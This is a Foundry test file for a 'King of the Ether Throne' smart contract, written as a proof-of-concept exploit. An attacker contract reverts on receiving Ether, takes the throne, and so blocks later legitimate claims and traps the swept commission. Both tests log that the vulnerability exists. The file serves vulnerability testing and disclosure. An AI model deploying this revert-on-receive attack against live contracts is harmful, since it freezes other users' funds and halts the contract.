// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/king_of_the_ether_throne.sol";

contract RevertOnReceive {
    function becomeKing(KingOfTheEtherThrone throne, uint256 price) public payable {
        throne.claimThrone{value: price}("Malicious");
    }

    function sweepCommission(KingOfTheEtherThrone throne, uint amount) public {
        throne.sweepCommission(amount);
    }

    receive() external payable {
        revert("I revert on purpose!");
    }
}

contract KingOfTheEtherThroneTest is Test {
    KingOfTheEtherThrone throne;
    RevertOnReceive attacker;
    address legitimateUser = makeAddr("legitimateUser");

    function _takeStateSnapshot() internal view returns (
        address monarch,
        uint256 throneBalance,
        uint256 attackerBalance
    ) {
        address monarchAddress;
        (monarchAddress, , , ) = throne.currentMonarch();
        return (
            monarchAddress,
            address(throne).balance,
            address(attacker).balance
        );
    }

    function _logState(string memory label) internal view {
        (address monarch, uint256 throneBal, uint256 attackerBal) = _takeStateSnapshot();
        console.log(">>>", label);
        console.log("CurrentMonarch:", monarch);
        console.log("ThroneBalance:", throneBal);
        console.log("AttackerBalance:", attackerBal);
    }

    function setUp() public {
        throne = new KingOfTheEtherThrone();
        attacker = new RevertOnReceive();
    }

    function _accumulateCommission() internal {
        address user1 = makeAddr("user1");
        uint256 price1 = throne.currentClaimPrice();
        vm.deal(user1, price1 * 2);
        
        vm.prank(user1);
        throne.claimThrone{value: price1}("User1");

        address user2 = makeAddr("user2");
        uint256 price2 = throne.currentClaimPrice();
        vm.deal(user2, price2 * 2);
        vm.prank(user2);
        throne.claimThrone{value: price2}("User2");
    }

    function test_ThroneClaimRevertsAfterMaliciousTakeover() public {
        // Pre-attack state
        _logState("PRE-ATTACK STATE");
        uint256 originalPrice = throne.currentClaimPrice();
        (address preMonarch, uint256 preThroneBal, uint256 preAttackerBal) = _takeStateSnapshot();
        
        // Attack occurs
        console.log("--- ATTACK TRIGGER: Attacker claims throne ---");
        uint256 attackPrice = originalPrice;
        vm.deal(address(attacker), attackPrice);
        attacker.becomeKing{value: attackPrice}(throne, attackPrice);
        
        // Post-attack state
        _logState("POST-ATTACK STATE");
        (address postAttackMonarch, uint256 postAttackThroneBal, uint256 postAttackAttackerBal) = _takeStateSnapshot();
        uint256 newClaimPrice = throne.currentClaimPrice();
        
        // Verify state changed
        require(
            preMonarch != postAttackMonarch || 
            preThroneBal != postAttackThroneBal || 
            preAttackerBal != postAttackAttackerBal,
            "Attack should modify state"
        );

        // Pre-legitimate claim state
        _logState("PRE-LEGITIMATE-CLAIM STATE");
        (address preClaimMonarch, uint256 preClaimThroneBal, uint256 preClaimAttackerBal) = _takeStateSnapshot();

        // Legitimate claim attempt
        console.log("--- OPERATION TRIGGER: Legitimate user claim attempt ---");
        vm.deal(legitimateUser, newClaimPrice * 2);
        vm.prank(legitimateUser);
        vm.expectRevert();
        throne.claimThrone{value: newClaimPrice}("Legitimate");

        // Post-claim (revert) state
        _logState("POST-LEGITIMATE-CLAIM STATE");
        (address postClaimMonarch, uint256 postClaimThroneBal, uint256 postClaimAttackerBal) = _takeStateSnapshot();
        
        // Verify state unchanged
        require(
            preClaimMonarch == postClaimMonarch &&
            preClaimThroneBal == postClaimThroneBal &&
            preClaimAttackerBal == postClaimAttackerBal,
            "State should remain unchanged after reverted claim"
        );
        
        // Final verdict
        console.log("=== FINAL VERDICT ===");
        console.log("Vulnerability Exists: Contract stuck due to reverted transfers");
    }

    function test_SweepCommissionRevertsToMaliciousContract() public {
        // Generate commission
        _accumulateCommission();
        uint commission = address(throne).balance;
        
        // Transfer ownership
        throne.transferOwnership(address(attacker));
        
        // Pre-sweep state
        _logState("PRE-SWEEP STATE");
        (address preMonarch, uint256 preThroneBal, uint256 preAttackerBal) = _takeStateSnapshot();

        // Sweep attempt
        console.log("--- ATTACK TRIGGER: Sweep commission to attacker ---");
        vm.expectRevert();
        attacker.sweepCommission(throne, commission);
        
        // Post-sweep state
        _logState("POST-SWEEP STATE");
        (address postMonarch, uint256 postThroneBal, uint256 postAttackerBal) = _takeStateSnapshot();
        
        // Verify state unchanged
        require(
            preMonarch == postMonarch &&
            preThroneBal == postThroneBal &&
            preAttackerBal == postAttackerBal,
            "State should remain unchanged after reverted sweep"
        );
        
        // Final verdict
        console.log("=== FINAL VERDICT ===");
        console.log("Vulnerability Exists: Commission ETH is stuck in contract");
    }
}